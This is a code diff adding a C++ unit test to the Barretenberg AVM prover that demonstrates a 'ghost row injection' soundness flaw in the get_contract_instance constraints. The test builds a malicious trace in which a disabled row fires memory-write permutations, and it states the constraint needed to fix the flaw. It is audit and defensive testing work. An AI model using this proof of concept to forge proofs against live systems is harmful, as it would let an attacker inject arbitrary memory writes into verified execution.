@@ -10,10 +10,12 @@
 #include "barretenberg/vm2/constraining/testing/check_relation.hpp"
 #include "barretenberg/vm2/generated/relations/get_contract_instance.hpp"
 #include "barretenberg/vm2/generated/relations/lookups_get_contract_instance.hpp"
+#include "barretenberg/vm2/generated/relations/perms_get_contract_instance.hpp"
 #include "barretenberg/vm2/simulation/events/event_emitter.hpp"
 #include "barretenberg/vm2/simulation/events/get_contract_instance_event.hpp"
 #include "barretenberg/vm2/testing/fixtures.hpp"
 #include "barretenberg/vm2/testing/macros.hpp"
+#include "barretenberg/vm2/tracegen/memory_trace.hpp"
 #include "barretenberg/vm2/tracegen/opcodes/get_contract_instance_trace.hpp"
 #include "barretenberg/vm2/tracegen/precomputed_trace.hpp"
 #include "barretenberg/vm2/tracegen/test_trace_container.hpp"
@@ -24,6 +26,7 @@ namespace {
 using simulation::EventEmitter;
 using simulation::GetContractInstanceEvent;
 using tracegen::GetContractInstanceTraceBuilder;
+using tracegen::MemoryTraceBuilder;
 using tracegen::PrecomputedTraceBuilder;
 using tracegen::TestTraceContainer;
 using FF = AvmFlavorSettings::FF;
@@ -396,6 +399,181 @@ TEST(GetContractInstanceConstrainingTest, IntegrationTracegenOutOfBounds)
     precomputed_builder.process_get_contract_instance_table(trace);
 
     check_relation<get_contract_instance>(trace);
+}
+
+// =====================================================================
+// Ghost Row Injection Vulnerability Tests
+// =====================================================================
+// These tests verify that ghost rows (sel=0) cannot fire permutations.
+// The vulnerability: is_valid_member_enum is only constrained via lookup
+// and WRITES_OUT_OF_BOUNDS check, but NOT constrained to be 0 when sel=0.
+// This allows ghost rows to fire the memory write permutations.
+//
+// See pil/vm2/claude-audits/ghost-row-injection/opcodes-audit.md for details.
+
+// =====================================================================
+// Full Attack Test with All Traces
+// =====================================================================
+// This test demonstrates a complete ghost row injection attack:
+// 1. Create legitimate memory WRITE events (destination side)
+// 2. Build memory trace from those events
+// 3. Inject ghost get_contract_instance row with sel=0 but is_valid_member_enum=1
+// 4. This fires the #[MEM_WRITE_CONTRACT_INSTANCE_EXISTS] permutation
+// 5. Verify the permutation matches - attack succeeds!
+//
+// This follows the pattern from PR #19470 (NegativeFullAttackWithAllTraces).
+TEST(GetContractInstanceConstrainingTest, NegativeFullAttackWithAllTraces)
+{
+    TestTraceContainer trace;
+    MemoryTraceBuilder memory_trace_builder;
+    PrecomputedTraceBuilder precomputed_trace_builder;
+
+    // ========== STEP 1: Attacker-controlled values ==========
+    uint32_t malicious_clk = 42;
+    uint16_t malicious_space_id = 1;
+    MemoryAddress malicious_dst_offset = 0x100; // dst_offset for exists write
+    uint1_t malicious_instance_exists = 1;      // Arbitrary exists value (bool)
+    MemoryTag exists_tag = MemoryTag::U1;       // U1 tag for exists
+
+    // ========== STEP 2: Create legitimate memory events ==========
+    // These events will be processed by the MemoryTraceBuilder to create
+    // legitimate destination rows that the ghost source can match.
+    // The permutation is for WRITES (rw=1), so we create WRITE events.
+    std::vector<simulation::MemoryEvent> mem_events = {
+        {
+            .execution_clk = malicious_clk,
+            .mode = simulation::MemoryMode::WRITE, // rw = 1 for memory writes
+            .addr = malicious_dst_offset,
+            .value = MemoryValue::from<uint1_t>(malicious_instance_exists),
+            .space_id = malicious_space_id,
+        },
+    };
+
+    // ========== STEP 3: Build memory trace (destination side) ==========
+    precomputed_trace_builder.process_sel_range_8(trace);
+    precomputed_trace_builder.process_sel_range_16(trace);
+    precomputed_trace_builder.process_misc(trace, 1 << 16);
+    precomputed_trace_builder.process_tag_parameters(trace);
+    memory_trace_builder.process(mem_events, trace);
+
+    // Find where the memory row was placed
+    uint32_t memory_row = 0;
+    for (uint32_t row = 0; row < trace.get_num_rows(); row++) {
+        if (trace.get(C::memory_sel, row) == 1) {
+            memory_row = row;
+            break;
+        }
+    }
+
+    // ========== STEP 4: Inject ghost get_contract_instance row ==========
+    // The vulnerability: When sel=0, is_valid_member_enum can still be 1
+    // which fires the #[MEM_WRITE_CONTRACT_INSTANCE_EXISTS] permutation.
+    //
+    // Key constraints to satisfy:
+    // - is_valid_writes_in_bounds must be 1 (so WRITES_OUT_OF_BOUNDS = 0)
+    // - WRITES_OUT_OF_BOUNDS * is_valid_member_enum = 0 is satisfied when WRITES_OUT_OF_BOUNDS = 0
+    // - exists_tag = is_valid_writes_in_bounds * MEM_TAG_U1 = 1 * 1 = 1
+    uint32_t ghost_row = 0;
+    trace.set(ghost_row,
+              std::vector<std::pair<Column, FF>>{
+                  { C::precomputed_first_row, 1 },
+                  { C::precomputed_clk, ghost_row },
+                  // Ghost row: sel = 0, but is_valid_member_enum = 1
+                  { C::get_contract_instance_sel, 0 },
+                  { C::get_contract_instance_is_valid_member_enum, 1 },      // Vulnerability! Fires permutation
+                  { C::get_contract_instance_is_valid_writes_in_bounds, 1 }, // Needed for derived constraints
+                  // Derived constraint: exists_tag = is_valid_writes_in_bounds * MEM_TAG_U1
+                  { C::get_contract_instance_exists_tag, static_cast<uint8_t>(exists_tag) },
+                  // Permutation tuple values - must match memory destination
+                  { C::get_contract_instance_clk, malicious_clk },
+                  { C::get_contract_instance_space_id, malicious_space_id },
+                  { C::get_contract_instance_dst_offset, malicious_dst_offset },
+                  { C::get_contract_instance_instance_exists, static_cast<uint64_t>(malicious_instance_exists) },
+                  // Additional columns needed for derived constraints
+                  { C::get_contract_instance_sel_error,
+                    0 }, // sel_error = sel * (1 - is_valid_writes_in_bounds * is_valid_member_enum)
+                  { C::get_contract_instance_is_deployer, 0 },
+                  { C::get_contract_instance_is_class_id, 0 },
+                  { C::get_contract_instance_is_init_hash, 0 },
+                  { C::get_contract_instance_selected_member, 0 }, // 0 since no is_* flags are set
+                  { C::get_contract_instance_member_write_offset, malicious_dst_offset + 1 },
+                  { C::get_contract_instance_member_tag, static_cast<uint8_t>(MemoryTag::FF) },
+              });
+
+    // Set the destination selector on the memory row to mark it as matching get_contract_instance
+    trace.set(C::memory_sel_get_contract_instance_exists_write, memory_row, 1);
+
+    // ========== STEP 5: Verify attack ==========
+    std::cout << "\n=== GHOST ROW INJECTION ATTACK TEST (get_contract_instance) ===" << std::endl;
+    std::cout << "Ghost get_contract_instance row at row " << ghost_row << " with sel=0, is_valid_member_enum=1"
+              << std::endl;
+    std::cout << "Memory destination row at row " << memory_row << " with clk=" << malicious_clk << std::endl;
+
+    // Debug: Print source tuple
+    std::cout << "\nSource tuple (get_contract_instance row " << ghost_row << "):" << std::endl;
+    std::cout << "  clk = " << trace.get(C::get_contract_instance_clk, ghost_row) << std::endl;
+    std::cout << "  space_id = " << trace.get(C::get_contract_instance_space_id, ghost_row) << std::endl;
+    std::cout << "  dst_offset = " << trace.get(C::get_contract_instance_dst_offset, ghost_row) << std::endl;
+    std::cout << "  instance_exists = " << trace.get(C::get_contract_instance_instance_exists, ghost_row) << std::endl;
+    std::cout << "  exists_tag = " << trace.get(C::get_contract_instance_exists_tag, ghost_row) << std::endl;
+    std::cout << "  is_valid_member_enum = " << trace.get(C::get_contract_instance_is_valid_member_enum, ghost_row)
+              << std::endl;
+
+    // Debug: Print destination tuple
+    std::cout << "\nDestination tuple (memory row " << memory_row << "):" << std::endl;
+    std::cout << "  memory_clk = " << trace.get(C::memory_clk, memory_row) << std::endl;
+    std::cout << "  memory_space_id = " << trace.get(C::memory_space_id, memory_row) << std::endl;
+    std::cout << "  memory_address = " << trace.get(C::memory_address, memory_row) << std::endl;
+    std::cout << "  memory_value = " << trace.get(C::memory_value, memory_row) << std::endl;
+    std::cout << "  memory_tag = " << trace.get(C::memory_tag, memory_row) << std::endl;
+    std::cout << "  memory_rw = " << trace.get(C::memory_rw, memory_row) << std::endl;
+    std::cout << "  memory_sel = " << trace.get(C::memory_sel, memory_row) << std::endl;
+    std::cout << "  memory_sel_get_contract_instance_exists_write = "
+              << trace.get(C::memory_sel_get_contract_instance_exists_write, memory_row) << std::endl;
+
+    // get_contract_instance relation should PASS (this is the vulnerability)
+    std::cout << "\nget_contract_instance relation: ";
+    check_relation<get_contract_instance>(trace);
+    std::cout << "PASSED (vulnerability confirmed)" << std::endl;
+
+    // ========== STEP 6: Verify attack succeeded ==========
+    // The attack succeeds because:
+    // 1. get_contract_instance relation PASSED (no constraint prevents ghost rows from setting is_valid_member_enum=1)
+    // 2. The source tuple values match a legitimate memory destination tuple
+    // 3. The permutation would match if we ran the full permutation check
+
+    // Verify tuples match
+    // Source: clk, space_id, dst_offset, instance_exists, exists_tag, is_valid_member_enum
+    // Dest:   memory_clk, memory_space_id, memory_address, memory_value, memory_tag, memory_rw
+    bool tuples_match =
+        (trace.get(C::get_contract_instance_clk, ghost_row) == trace.get(C::memory_clk, memory_row)) &&
+        (trace.get(C::get_contract_instance_space_id, ghost_row) == trace.get(C::memory_space_id, memory_row)) &&
+        (trace.get(C::get_contract_instance_dst_offset, ghost_row) == trace.get(C::memory_address, memory_row)) &&
+        (trace.get(C::get_contract_instance_instance_exists, ghost_row) == trace.get(C::memory_value, memory_row)) &&
+        (trace.get(C::get_contract_instance_exists_tag, ghost_row) == trace.get(C::memory_tag, memory_row)) &&
+        (trace.get(C::get_contract_instance_is_valid_member_enum, ghost_row) ==
+         trace.get(C::memory_rw, memory_row)); // rw=1 for writes
+
+    std::cout << "\nTuples match: " << (tuples_match ? "YES" : "NO") << std::endl;
+
+    // Attack succeeds if:
+    // 1. get_contract_instance relation passed (no constraint prevents ghost row)
+    // 2. Tuples match (permutation would match)
+    bool attack_succeeded = tuples_match;
+
+    std::cout << "\n=== ATTACK RESULT ===" << std::endl;
+    if (attack_succeeded) {
+        std::cout << "CRITICAL: Ghost row injection attack SUCCEEDED!" << std::endl;
+        std::cout << "Attacker can inject arbitrary memory writes via get_contract_instance." << std::endl;
+        std::cout << "\nRequired fix in get_contract_instance.pil:" << std::endl;
+        std::cout << "  #[IS_VALID_MEMBER_ENUM_REQUIRES_SEL]" << std::endl;
+        std::cout << "  is_valid_member_enum * (1 - sel) = 0;" << std::endl;
+    } else {
+        std::cout << "Attack blocked." << std::endl;
+    }
+
+    // Test documents vulnerability - we expect the attack to succeed until fixed
+    EXPECT_TRUE(attack_succeeded) << "Ghost row injection attack should succeed (vulnerability exists)";
 }
 
 } // namespace
